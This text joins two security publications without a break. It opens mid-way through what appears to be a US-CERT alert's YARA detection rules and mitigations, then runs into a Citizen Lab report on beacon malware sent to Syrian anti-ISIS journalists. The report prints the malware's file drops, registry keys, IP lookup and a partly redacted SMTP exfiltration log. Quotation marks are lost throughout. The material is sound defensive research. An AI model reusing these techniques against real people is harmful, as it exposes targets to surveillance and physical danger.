$openServiceManager =
{FF15???0?0?08B?885??74????????????????5?FF15???0?0?08B?????0?0?08BF?85F?74}
condition:
all of them
Malware used by cyber threat actor:
strings:
$str1 = "_quit"
$str2 = "_exe"
$str3 = "_put"
$str4 = "_got"
$str5 = "_get"
$str6 ="_del"
$str7 = "_dir"
$str8 = { C7 44 24 18 1F F7}
condition:
(uintl6(0) == 0x5A4D or uintl6(0) == 0xCFD0 or uintl6(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
Malware used by cyber threat actor:
strings:
$STR1 = { 50 68 80 00 00 00 68 FF FF 00 00 51 C7 44 24 1C 3a 8b 00 00 }
condition:
(uintl6(0) == 0x5A4D or uint16(0) == 0xCFD0 or uintl6(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them
Recommended Security Practices
Because of the highly destructive functionality of the malware, an organization infected with the malware could experience operational impacts including loss of
intellectual property (IP) and disruption of critical systems. Actual impact to organizations may vary depending on the type and number of systems impacted.
Tactical Mitigations
      Implement the indicators of compromise within your systems for detection and mitigation purposes.
      Encourage users to transfer critical files to network shares, to allow for central backed up.
      Execute daily backups of all critical systems.
      Periodically execute an 
offline
 backup of critical files to removable media.
      Establish emergency communications plans should network resources become unavailable.
      Isolate any critical networks (including operations networks) from business systems.
     Identify critical systems and evaluate the need for having on-hand spares to quickly restore service.
     Ensure antivirus is up to date.
     Disable credential caching for all desktop devices with particular importance on critical systems such as servers and restrict the number of cached credential
     for all portable devices to no more than three if possible. This can be accomplished through a Group Policy Object (GPO).
     Disable AutoRun and Autoplay for any removable media device.
     Prevent or limit the use of all removable media devices on systems to limit the spread or introduction of malicious software and possible exfiltration data,
     except where there is a valid business case for use. This business case must be approved by the organization Chief IT Security Officer, with policy/guidance
     on how such media should be used.
     Consider restricting account privileges. It is our recommendation that all daily operations should be executed using standard user accounts unless
     administrative privileges are required for that specific function. Configure all standard user accounts to prevent the execution and installation of any unknown
     or unauthorized software. Both standard and administrative accounts should have access only to services required for nominal daily duties, enforcing the
     concept of separation of duties. Lastly, disable Web and email capabilities on administrative accounts. Compromise of admin accounts is one vector that
     allows malicious activity to become truly persistent in a network environment.
     Ensure that password policy rules are enforced and Admin password values are changed periodically.
     Consider prohibiting hosts within the production environment or DMZ from sharing an Active Directory enterprise with hosts on other networks. Each
     environment should have separate forests within Active Directory, with no trust relationships allowed between the forests if at all possible. If necessary, the
     trust relationships should be one-way with the low integrity environment trusting the higher integrity environment.
     Consider deployment of a coaching page with click through acceptance; these are traditionally deployed in an environment to log the acceptance of network
     acceptable use policy or to notify users of monitoring. Coaching pages also provide some measure of protection from automated malicious activity. This
     occurs because automated malware is normally incapable of physically clicking an acceptance radial button. Automated malware is traditionally hardcoded to
     execute, then retrieve commands or additional executables from the Internet. If the malware is unable to initiate an active connection, the full train of infection
     is potentially halted. The danger still exists that the physical user will authorize access, but through the use of coaching pages, infections can be limited or at
     least the rate of infection reduced.
     Monitor logs -- Maintain and actively monitor a centralized logging solution that keeps track of all anomalous and potentially malicious activity.
     Ensure that all network operating systems, web browsers, and other related network hardware and software remain updated with all current patches and
     fixes.
Strategic Mitigations
     Organizations should review Security Tip Handling Destructive Malware #ST13-003 and evaluate their capabilities encompassing planning, preparation,
     detection, and response for such an event.
     Always keep your patch levels up to date, especially on computers that host public services accessible through the firewall, such as HTTP, FTP, mail, and
     DNS services.
     Build host systems, especially critical systems such as servers, with only essential applications and components required to perform the intended function.
     Any unused applications or functions should be removed or disabled, if possible, to limit the attack surface of the host.
     Implement network segmentation through V-LANs to limit the spread of malware.
     Consider the deployment of Software Restriction Policy set to only allow the execution of approved software (application whitelisting)
     Recommend the whitelisting of legitimate executable directories to prevent the execution of potentially malicious binaries.
     Consider the use of two-factor authentication methods for accessing privileged root level accounts or systems.
     Consider deploying a two-factor authentication through a hardened IPsec/VPN gateway with split-tunneling prohibited for secure remote access.
     Deny direct Internet access, except through the use of proxies for Enterprise servers and workstations. Perform regular content filtering at the proxies or
     external firewall points of presence. Also consider the deployment of an explicit versus transparent proxy policy.
     Implement a Secure Socket Layer (SSL) inspection capability to inspect both ingress and egress encrypted network traffic for potential malicious activity.
     Isolate network services, such as email and Web application servers by utilizing a secure multi-tenant virtualization technology. This will limit the damage
     sustained from a compromise or attack of a single network component.
     Implement best practice guidance and policy to restrict the use of non-Foundation assets for processing or accessing Foundation-controlled data or systems
     (e.g., working from home, or using a personal device while at the office). It is difficult to enforce corporate policies, detect intrusions, and conduct forensic
     analysis or remediate compromises on non-corporate owned devices.
     Minimize network exposure for all control system devices. Control system devices should not directly face the Internet.
     Place control system networks behind firewalls, and isolate or air gap them from the business network.
     When remote access is required, use secure methods, such as Virtual Private Networks (VPNs), recognizing that VPN is only as secure as the connected
     devices.
     Industrial Control System (ICS)-CERT and US-CERT remind organizations to perform proper impact analysis and risk assessment prior to taking defensive
     measures.
References
     N/A
Revisions
     December 19, 2014: Initial Release
                                       This product is provided subject to this Notification and this Privacy & Use policy.
Malware Attack Targeting Syrian ISIS Critics
by John Scott-Railton and Seth Hardy
With the collaboration of Cyber Arabs.
Media coverage: Associated Press, Forbes
Summary
This report describes a malware attack with circumstantial links to the Islamic State in Iraq and Syria. In the interest of
highlighting a developing threat, this post analyzes the attack and provides a list of Indicators of Compromise.
A Syrian citizen media group critical of Islamic State of Iraq and Syria (ISIS) was recently targeted in a
customized digital attack designed to unmask their location. The Syrian group, Raqqah is being Slaughtered
Silently (RSS), focuses its advocacy on documenting human rights abuses by ISIS elements occupying the city of Ar-
Raqah. In response, ISIS forces in the city have reportedly targeted the group with house raids, kidnappings, and an
alleged assassination. The group also faces online threats from ISIS and its supporters, including taunts that ISIS is spying
on the group.
Though we are unable to conclusively attribute the attack to ISIS or its supporters, a link to ISIS is
plausible. The malware used in the attack differs substantially from campaigns linked to the Syrian
regime, and the attack is focused against a group that is an active target of ISIS forces.
Background: Citizen Journalists under Threat in ISIS-controlled Territories
As the Syrian Civil War continues, Syrian citizen journalists and nonviolent activists operate in an increasingly unsafe
environment. The regime has never welcomed their work, and has often targeted them for arrest and detention, and a
multi-year hacking campaign (see Pro-Regime / Regime Linked Groups). Additionally, not all elements of the Syrian
opposition have uniformly supported nonviolent activists and citizen journalists. More recently, in areas like Raqqah,
nonviolent activists face a new and exceptionally grave threat: ISIS. A growing number of reports suggest that ISIS is
systematically targeting groups that document atrocities, or that communicate with Western media and aid organizations,
sometimes under the pretext of finding 
spies
Map: Raqqah is indicated by the red arrow. Colors indicate areas mostly under the control of the following groups:
Black = ISIS, Red = Syrian Regime, Green = Free Syrian Army, Yellow = Kurdish. Note: the map is not highly detailed,
nor completely up-to-date, but is useful in showing general areas of control. Source: @DeSyracuse
Ar-Raqqah, the city in which the case study is located, is situated in northern Syria and continues to be a key conflict
flashpoint of the Syrian Civil War. In the spring of 2013, Islamists and Free Syrian Army (FSA) fighters took over Ar-
Raqqah from regime forces. As ISIS gained momentum, they consolidated their control over the city, edging out FSA-
affiliated groups through attacks, summary executions, and kidnappings against a range of groups, including ethnic and
religious minorities.
Information Control by ISIS
During 2014, there were a number of reports
many unconfirmed
that ISIS confiscated smartphones and laptops from
captured activists. According to Syrians who experienced these searches and spoke with one of the reports
 authors, ISIS
sometimes extracts data from confiscated smartphones and laptops to collect information about people and groups they
are targeting, as well as to seek evidence of 
un-Islamic
 activities.
As ISIS cements their control of Ar-Raqqah and other territories, reports have emerged recently (though not all of them
confirmed) suggesting that elements within ISIS are growing increasingly sophisticated at imposing control and targeting
opponents using digital methods. Reports about ISIS targeting Internet caf
s have grown increasingly common, and in
some cases reports point to the possible use of keyloggers as well as unspecified 
IP sniffers
 to track behaviour in Internet
cafes.
The Situation of Nonviolent Activists and Citizen Journalists in Ar-Raqqah
Nonviolent activists and citizen journalists based in Ar-Raqqah have provided the outside world with much of what we
know about how ISIS treats the population. These activists and journalists face mortal danger for their actions, and
reports have emerged of their detention and torture at the hands of ISIS.
As ISIS continues to use social media to push the message that it is welcomed by the population of Ar-Raqqah, groups like
Raqqah is being Slaughtered Silently (RSS) provide a compelling counter narrative. RSS hasn
t escaped ISIS
 notice, and
the group has been targeted for kidnappings, house raids, and at least one alleged targeted killing. At the time of writing,
ISIS is allegedly holding several citizen journalists in Ar-Raqqah.
Image 1: Example of an online threat made against RSS. The image, which cannot be confirmed, purports to show CCTV
installed around Raqqah.
In addition, RSS is targeted online by ISIS supporters with harassment, including threats to the physical safety of its
members. For example, ISIS supporters have claimed that ISIS has established a system of CCTV cameras in Ar-Raqqah to
observe residents
 movements. While this claim may be a bluff or exaggeration, at least one ISIS supporter has indicated
on social media that this system could be used to look for members of RSS.
Analyzing the Attack
This section describes a highly targeted attack sent to an e-mail address belonging to RSS. The Citizen Lab analyzed this
attack with the consent of RSS, which requested that their name be used in this report.
The attack took the form of an unsolicited e-mail containing a download link to a decoy file. The file
contained custom malware that profiled the victim
s computer and beaconed its IP address to an e-mail
account under the attacker
s control.
The Targeting of RSS
The unsolicited message below was sent to RSS at the end of November 2014 from a Gmail email address. The message
was carefully worded, and contained references specific to the work and interests of RSS.
Targeting Email
Thank you for your efforts to deliver a true picture of the reality of life in Raqqah. As Syrians residing in Canada we are
working with media because we believe in the importance of shedding light on the realities of life in Syria, and Raqqah in
particular. We are preparing a lengthy news report on the realities of life in Raqqah. We are sharing some information
with you with the hope that you will correct it in case it contains errors. We have prepared a map of the city of Raqqah, in
addition to a preliminary report. We hope that you have a look at it with them and inform us of any errors. We also hope
that if you happen to be on Facebook, you could provide us with the account of the person responsible for the campaign, if
you don
t mind, so that we can communicate with him directly.
You can see a preliminary copy of the report on this linkhttp://tempsend [DOT]com/[Redacted]With all respect
[Name Redacted]
Original Arabic
+ 567
I+7 , 
+ M6
+7 >
+7 :
http://tempsend [DOT]com/[Redacted]
[Name Redacted]
We are unsure why the attacker specifically mentions Canada in the email lure. However, it is well known that Syria
extensive diaspora (including in Canada) regularly engages in advocacy, sometimes in coordination with groups within
Syria. Thus, the message is not on its face implausible. However, we note that the attacker also attempts to social
engineer the identity of individuals working with RSS, by requesting a personal Facebook page.
Analyzing the Malware
The custom malware used in this attack infects a user who views the decoy 
slideshow,
 and beacons home with the IP
address of the victim
s computer and details about his or her system each time the computer restarts.
Unlike Syrian regime-linked malware, it contains no Remote Access Trojan (RAT) functionality,
suggesting it is intended for identifying and locating a target.
Further, because the malware sends data captured by the malware to an e-mail address, it does not require that the
attackers maintain a command-and-control server online. This functionality would be especially useful to an adversary
unsure of whether it can maintain uninterrupted Internet connectivity.
Narrative of Infection
Accessing the link provided in the malicious e-mail sends the user to a .zip file hosted on file-sharing site
tempsend.com. At the time of writing the file had been downloaded only 10 times
Image 2: Tempsend screenshot
The file to be downloaded is 
slideshow.zip
MD5: b72e6678e79cc57d33e684528b5721bd
This file contains slideshow.exe
MD5: f8bfb82aa92ea6a8e4e0b378781b3859
This file is a self-extracting archive with an icon intended to suggest to the victim that it is itself a slideshow.
When run, the file opens a slideshow of Google Earth screen captures to the victim, displaying a series of locations in
Syria, and highlighting an 
ISIS HQ
 and other images showing the alleged locations of US airstrikes.
Examples of images in the slideshow as follows:
Infection and Data Collection
When opened, the 
slideshow.zip
 file writes and executes several files:
C:\Users\[Username]\AppData\Local\Temp\IXP000.TMP\AdobeR1.exe C:\Users\
[Username]\AppData\Local\Temp\IXP000.TMP\pictures.exe
AdobeR1.exe
 is malicious, while 
pictures.exe
 is the genuine slideshow displayed to the victim. When the slideshow is
closed both AdobeR1.exe and pictures.exe are deleted.
The AdobeR1 file writes a series of executable files that perform information collection and communication functions,
including:
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\AdbrRader.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\AdobeIns.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\GoogleUpate.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\GooglUpd.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\nvidrv.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\nvisdvr.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\rundl132.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\svhosts.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\nvidrv.exe
Program Sequence
The program sequence of data collection and sending is somewhat unusual, with each program performing a single task
and communicating via markers left in the registry. Programs appear to make use of the Visual C++ Runtime Library.
First, the program nvidrv adds itself to autorun:
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run under name 
UpdAdbreader
It also creates a series of registry keys that the individual programs use to communicate:
Registry keys and programs using them:
rundl132.exe:
DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K6F-DKV8J-FKVJI-
GVKBU\6nvisdvr.exe:
DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K4F-DKV8J-FKVJI-
GVKBU\4GoogleUpate.exe:
DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K3F-DKV8J-FKVJI-
GVKBU\3AdbrRader.exe:
DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K2F-DKV8J-FKVJI-
GVKBU\2nvidrv.exe:
DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K1F-DKV8J-FKVJI-GVKBU\1
Sets name 
 to StartupInfo structure as a string, e.g. 
0x3110x611
It then runs GooglUpd, which cleans up the program files if they exist, and runs AdbrRader. AdbrRader
(communicating through registry key 
) writes the file vgadmysadm.tmp with the name of another registry key 
 with
startup info.
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\ vgadmysadm.tmp
Next, nvidrv runs GoogleUpate, which collects system information and writes it to:
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\vg2sxoysinf.tmp
Then nvidrv runs nvisdvr (registry key 
) that collects a list of running processes, which are written to:
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\v2cgplst.tmp
Finally, nvidrv runs svhosts, which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com.
It then runs rundl132 if it has not before, by checking whether registry key name 
 is present. It sets the key to 
 and
runs it.
Next, 
rundl132.exe
 performs an HTTP GET request to myexternalip.com and collects the external IP of the infected
machine:
GET /raw HTTP/1.1
Host: myexternalip.com
Cache-Control: no-cacheHTTP/1.1 200 OK
Server: nginx/1.6.2
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: close
Date: [REDACTED]
My-External-Ip: [REDACTED]f
[REDACTED]0
Next, rundl132 writes:
C:\Users\[Username]\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\Q7B90TFG\raw[1].txt
Then rundl132 writes the external IP to:
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\vgosysaext.tmp
Finally, rundl132 runs AdobeIns, which zips the contents of the win32.tmp folder.
Program 
AdobeIns.exe
 takes the files written by the other programs and zips them in an encrypted, password-
protected file:
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\drv.sys\mxtd
Data Transmission
Data is transmitted by e-mail to an account presumably controlled by the attacker.
AdobeIns connects to an account at the online e-mail provider inbox.com via smtp using hardcoded credentials. The
malware then sends an e-mail to the same inbox containing the text 
Hello
 and with mxtd file attached.
SMTP traffic generated by the malware to inbox.com (with redactions)
220 [REDACTED]ESMTP Postfix
EHLO [REDACTED]
250-[REDACTED]
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
MAIL FROM:< [REDACTED]@inbox.com>
250 2.1.0 Ok
RCPT TO:< [REDACTED]@inbox.com>
250 2.1.5 Ok
DATA
354 End data with .
Date: [REDACTED]
From: <[REDACTED]@inbox.com>
X-Priority: 3 (Normal)
To: <[REDACTED]@inbox.com>
Subject: repo
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=
__MESSAGE__ID__[REDACTED]
__MESSAGE__ID__[REDACTED]
Content-type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bitHello
__MESSAGE__ID__[REDACTED]
Content-Type: application/x-msdownload; name=
mxtd
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=
mxtd
[REDACTED]
__MESSAGE__ID__[REDACTED]
250 2.0.0 Ok: queued as [REDACTED]
QUIT
221 2.0.0 Bye
Evaluation of the Malware
s Functionality
The malware seen in this case study is unusual as it relies on a half-dozen separate executable files, each with a
single task, and each communicating via markers dropped in the Registry.
The malware is also interesting because it does not provide remote access, but only sends an e-mail containing
the victim
s IP address and miscellaneous system information. The malware resends the information each time
the computer is restarted, but it does not refresh the sent information on restart (which may be a bug). This behaviour
strongly suggests that the function of this malware is to serve as a beacon. The system information could be used to
identify processes to exploit in the future, however since the attacker has already triggered the execution of a file on the
victim
s system, it is surprising that more was not taken, or that a RAT (custom or widely available) was not used. A RAT
would have provided much greater access alongside IP information
By not providing remote access and other RAT functionality, the program looks less like malware, and may attract less
attention from endpoint protection tools and scanners. Detections were low when the file was first submitted to
VirusTotal, for example. It registered only 6/55 detections by anti virus scanners, or a 10% detection rate.
Transmitting the malware via e-mail also provides a degree of obscurity, and has the additional advantage of providing a
layer of abstraction between the attacker and the target: there is no need to maintain a RAT command-and-control server.
The malware transmits autonomously, leaving the material in an inbox for the attacker to collect at a later time.
The malware has no obfuscation processes and is not highly technical in its development or interaction with Windows.
Nevertheless, we believe that the author of the program is aware of certain techniques to reduce the visibility of malware
on a network, including transmitting data via encrypted e-mail communications. However, the attacker has not correctly
implemented encrypted e-mail: the malware will not attempt to use a TLS connection in certain cases. As a result, account
login credentials may be readily available in network traffic.
In addition, the malware uses the old PKWARE implementation of zip encryption, which is not particularly secure. The
password for the zipped file is also present in the binary without encryption or obfuscation.
Targeted Threats Index
Citizen Lab researchers have developed the Targeted Threat Index (TTI) as a tool to standardize information about the
sophistication of targeted threats against civil society groups in our research. The index captures information about the
level of social engineering used (
Targeting Sophistication
), and adds a Technical Sophistication value for the attack as a
multiplier.
This attack, which has little technical sophistication (i.e., it uses no exploits, code obfuscation, or techniques to frustrate
reversing, etc.), nevertheless has carefully developed social engineering in the seeding materials and bait document. Taken
together it rates a 3 for Targeting Sophistication and a 1.25 for Technical Sophistication by our metric, yielding a TTI score
of 3.75. Citizen Lab research using the TTI has found that, despite low levels of technical sophistication, with well-crafted
social engineering malware attacks remain highly effective against civil society groups. More information is available
about the TTI in a recent Usenix Security paper.
Attribution
There are at least three possible sources for this malware attack:
      Pro-regime / regime-linked malware groups
      ISIS-linked hackers
      Other, unknown actors
We evaluate each of these possibilities in turn, drawing on the information available to us after almost three years of
tracking regime-linked malware.
Pro-Regime / Regime-Linked Groups
Pro-regime malware actors have continually targeted the Syrian opposition with waves of malware since at least late 2011.
Those campaigns have been extensively reported on by a range of groups, including Kaspersky, FireEye, Citizen Lab, the
Electronic Frontier Foundation, and many others. Regime-linked malware has a number of common features that
typically serve as distinguishing characteristics:
      Social engineering focusing on the needs and interests of the opposition. Although targeted, the malware seeding
      often aims at classes of people (e.g., people interested in 
shocking
 news about a fighter, or 
leaked
 information
      about the Assad regime) rather than carefully written spear phishing targeting a single individual or small group.
      Use of widely available RATs (njRAT, Xtreme Rat, ShadowTech Rat, DarkComet RAT, and Blackshades RAT, among
      others).
      At least one command-and-control server located within Syrian IP space (often from a limited range of addresses).
      Frequent use of Dynamic DNS providers like no-ip.
      Use of 
crypters
 to obscure the binary.
These characteristics are not all present in every sample, but we have typically found one or more in almost every binary
we have examined that is Syrian regime-linked.
This malware attack differs from known regime-linked groups in each of these elements. Not only is it
exceptionally targeted, but it is also not a commonly available RAT. Nor does it have RAT functionality. The function of
the malware appears to be: identify and unmask the IP address of target(s), and resend them to the attacker with each
reboot. In addition, data is sent to an Internet e-mail address, and no crypter is used to obscure the binary.
We are aware of only one previous case in Syria in which e-mail was used to transmit data, and that we believed was
regime linked. That incident, observed in 2012, also used hardcoded e-mail to exfiltrate. However, that malware had
substantially more functionality than this case: not only did it drop a second stage from a compromised site, but was also
included a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype.
The lack of overlap in Tactics, Techniques, and Procedures (TTPs) between this attack and prior attacks does not rule out
Syrian regime-linked attackers. It is possible that regime-linked groups are trying a new approach. However, given that
known regime-linked groups continued to remain active during the same date range using familiar TTPs, this scenario
seems unlikely. In addition, it would be strange for regime-linked malware groups to undertake significant effort to
prepare and send an implant that has significantly less functionality than what they commonly use. Taken together, we
find this evidence supports the hypothesis that familiar regime-linked groups did not conduct the attack.
ISIS-linked Hackers
RSS operates in territory controlled by ISIS, and has faced extensive targeting by ISIS. Currently, they appear to be
directly targeted by ISIS for kidnappings and other retaliation, including executions. In addition, ISIS supporters have
explicitly suggested that the group is under surveillance and actively hunted. Together this evidence suggests that ISIS
has a strong motivation for using social engineering and/or malware to locate the members of RSS.
We think there are several features of the malware attack that align with the needs and constraints of
ISIS and its supporters in Ar-Raqqah, more so than other groups, as we understand them. For example:
      The malware beacons location but does not provide RAT functionality.
      The seeding attempts to obtain a 
private
 Facebook identity from RSS through social engineering.
      The malware exfiltrates to an online e-mail account, thus not requiring the attacker to maintain a command-and-
      control server online.
The social media activity of members of RSS is often highly public. Their location and exact membership, however, is
secret. We speculate that if an attacker were interested in maintaining long-term surveillance of the activities of RSS they
could have employed a RAT. However, if the attacker were interested in unmasking the location of its targets so they could
be physically tracked down, collecting IP data and system info would be a more reasonable approach.
ISIS or its supporters clearly have a strong interest in the (rudimentary) location tracking of the members of RSS that this
malware provides. Internet connectivity in Raqqah is extremely limited, and some of it is under ISIS control. Knowing the
IP address of a target could quickly narrow down targets to specific locations, and specific Internet services, or Internet
cafes in Raqqah. Given that the identities and locations of RSS members are closely guarded, such information would hold
significant intelligence value for ISIS. Armed with this kind of information, ISIS could physically harm people within
Raqqah (and it is also possible that they have the ability to operate in some capacity in border areas of Turkey).
Little is publicly known about the technical capabilities of ISIS and its supporters; however, reports have begun to emerge
suggesting that ISIS is interested in expanding its abilities. In addition, ISIS has reportedly gained the support of at least
one individual with some experience with social engineering and hacking: Junaid Hussain (aka TriCk), a former member
of teamp0ison hacking team. While Mr. Hussain and associates have reportedly made threats against Western
governments, it is possible that he or others working with ISIS have quietly supported an effort to identify the targeted
organization, which is a highly visible thorn in the side of ISIS.
Other Unknown Actors
It is possible that the attack is the product of actors working for unknown purposes and targeting RSS. Given the activities
of RSS, however, it is unclear who this might be. It is not possible, for example, to reject the theory that some unknown
group within the FSA, or other groups opposing the Assad regime are responsible. Citizen journalists in Ar-Raqqah were
previously critical of arbitrary arrests carried out by non-ISIS groups in 2013. However, it is unclear why those groups,
which no longer control Ar-Raqqah, would be interested in RSS in November 2014.
It is likely that third party actors, including several intelligence services, are closely monitoring various actors in the
conflict through a range of electronic means. However, there is little reason to suggest that they would use a tailored but
technically rudimentary attack to target RSS in particular.
Conclusion: ISIS Can
t Be Ruled Out
After considering each possibility, we find strong but inconclusive circumstantial evidence to support a
link to ISIS. However, we are unable to connect this attack directly to ISIS, Mr. Hussain, or other ISIS supporters. If
indeed ISIS or its supporters are responsible, it seems reasonable that such an offensive capability may still be in
development.
We hope that publishing this report will draw attention to a new and concerning threat that includes ISIS critics among its
targets. If ISIS is responsible, while this attack targets in-country impediments to ISIS objectives, other targets may
include ideological or military adversaries abroad.
Whether or not ISIS is responsible, this attack is likely the work of a non-regime threat actor who may be just beginning to
field a still-rudimentary capability in the Syrian conflict. The entry costs for engaging in malware attacks in a conflict like
the Syrian Civil War are low, and made lower by the fact that the rule of law is nonexistent for large parts of the country. In
still other parts (under regime control), malware attacks appear to be state sanctioned.
Attacks Targeting Civil Society
Citizen Lab research into targeted digital threats against civil society confirms that civil society groups
face grave threats from targeted malware attacks, despite being under-resourced to defend against them.
The case highlighted here is no exception: lack of IT and security resources have made it difficult for the Syrian opposition
to address targeted and persistent digital threats against them. In addition, if ISIS is indeed responsible, this case suggests
how easy it is for belligerents in a conflict to begin fielding basic offensive digital capabilities, and how quickly the
capabilities can be pointed at unarmed civil society groups.
Warning: Social Engineering Thrives in Syrian Context
This attack was exceptionally targeted, and clearly reflected the work of an actor familiar with the operations of the
targeted organization. As most organizations working on issues surrounding Syria are aware, malware delivered with good
social engineering is a constant source of danger.
This particular attack can be prevented by not opening files sent by unknown persons. However, many
attacks in Syria come from hijacked accounts and impersonate people known to the targets. Social engineering remains an
unsolved problem, and continues to compromise groups throughout the Syrian opposition and their supporters.
This attack reaffirms the dangers posed by social engineering attacks, whether they deliver phishing campaigns or
malware. The circumstantial evidence of ISIS involvement suggests that groups working on topics that ISIS considers a
threat, and their partner organizations and supporters, should urgently examine their security policies and assess
the possible risks to their operations, and the consequences of exposure of sensitive information to ISIS.
Even if the link to ISIS turns out to be incorrect, it is possible that this will be a threat in the future.
Individuals and groups at risk can also consult materials in Arabic provided by Cyber Arabs including a series of very
accessible videos on digital security.
Indicators of Compromise
The malware files
        Filename                                            MD5
 slideshow.zip               b72e6678e79cc57d33e684528b5721bd
 slideshow.exe               f8bfb82aa92ea6a8e4e0b378781b3859
Files dropped by the malware
                              Filename and Path                                                       MD5
 C:\Users\
 [Username]\AppData\Local\Temp\IXP000.TMP\AdobeR1.exe                                aa6bcba23cd39c2827d72d33f5104856
 (note: folder and file deleted after slideshow closed)
 C:\Users\
 [Username]\AppData\Local\Temp\IXP000.TMP\pictures.exe (note:                        eda83c8e4ba7d088593f22d56cf39d9f
 folder and file deleted after slideshow closed)
 C:\Users\
                                                                                     9d36e8e3e557239d7006d0bb5c2df298
 [Username]\Microsoft\Windows\Z0xapp8T.tmp\AdbrRader.exe
 C:\Users\
                                                                                     1d5d8c5ce3854de61b28de7ca73093f1
 [Username]\Microsoft\Windows\Z0xapp8T.tmp\AdobeIns.exe
 C:\Users\
                                                                                     55039dd6ce3274dbce569473ad37918b
 [Username]\Microsoft\Windows\Z0xapp8T.tmp\GoogleUpate.exe
 C:\Users\
                                                                                     efdd9b96ae0f43f7d738ead2e1d5430c
 [Username]\Microsoft\Windows\Z0xapp8T.tmp\GooglUpd.exe
 C:\Users\
                                                                                     0e3eb8de93297f12b56de9fc33657066
 [Username]\Microsoft\Windows\Z0xapp8T.tmp\nvidrv.exe
 C:\Users\
                                                                                     3eb6f95c321ace0e3b101fd7e2cdd489
 [Username]\Microsoft\Windows\Z0xapp8T.tmp\nvisdvr.exe
 C:\Users\
                                                                                     84bbd592a212f5a84923e82621e9177d
 [Username]\Microsoft\Windows\Z0xapp8T.tmp\rundl132.exe
 C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\
                                                                                     13caa1c95e6610f2d5134174e1fb4fd0
 svhosts.exe
Collected Information Files (unencrypted)
                                      Filename and Path
 C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\v2cgplst.tmp
 C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\vg2sxoysinf.tmp
 C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\vgadmysadm.tmp
 C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\vgosysaext.tmp
Exfiltrated file (encrypted)
                                     Filename and Path
    C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\drv.sys\mxtd
Registry Keys
                                     Filename and Path
    DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K1F-
    DKV8J-FKVJI-GVKBU\1
    DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K2F-
    DKV8J-FKVJI-GVKBU\2
    DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K3F-
    DKV8J-FKVJI-GVKBU\3
    DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K4F-
    DKV8J-FKVJI-GVKBU\4
    DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K6F-
    DKV8J-FKVJI-GVKBU\6
Acknowledgements
Acknowledgements: We are grateful to Cyber Arabs and the Institute for War and Peace Reporting for their critical work
and assistance.
Special thanks to: several anonymous Syrians, Masashi Crete-Nishihata, Sarah McKune, Morgan Marquis-Boire, Ron
Deibert, Bill Marczak, Nart Villeneuve, Irene Poetranto, and Kristen Dennesen.
Support for this research is provided by grants from the John D. and Catherine T. MacArthur Foundation and the Ford
Foundation.
Footnotes
1   https://www.hate-speech.org/intense-hunt-for-americas-spies/
2   http://www.ibtimes.com/isis-militants-target-high-speed-internet-cafes-Raqqah-stronghold-1745382 (note that this
report also sources Raqqah is being Slaughtered Silently)
3   https://www.hate-speech.org/intense-hunt-for-americas-spies/
4   http://www.telegraph.co.uk/news/worldnews/islamic-state/11291510/Syrian-activist-tell-of-brutal-torture-by-Assad-
regime-and-Isil.html
5   https://twitter.com/Raqqah_sl and http://www.Raqqah-sl.com
6   Special thanks to Cyber Arabs for assistance with the translation
https://www.virustotal.com/en/file/d9da10e6381cb5c97a966bab0e3bdb3966a61e3e49147cd112dc3beabe22a2c3/analysis/
8   https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-hardy.pdf
9   https://securelist.com/files/2014/08/KL_report_syrian_malware.pdf
